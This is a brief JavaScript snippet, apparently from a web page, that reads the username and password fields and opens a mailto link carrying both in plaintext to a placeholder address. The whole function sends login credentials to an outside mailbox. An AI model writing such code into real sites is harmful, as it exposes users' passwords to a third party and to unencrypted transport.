// Function to email username and password to my email using user's mail client
function emailCredential() {
  var subject = 'User credentials';
  var body = 'Username: ' + $('#username').val() + '\n' + 'Password: ' +$('#password').val();
  body = encodeURIComponent(body);

  window.open('mailto:myemail@mydomain.com?subject='+subject+'&body='+body);
}
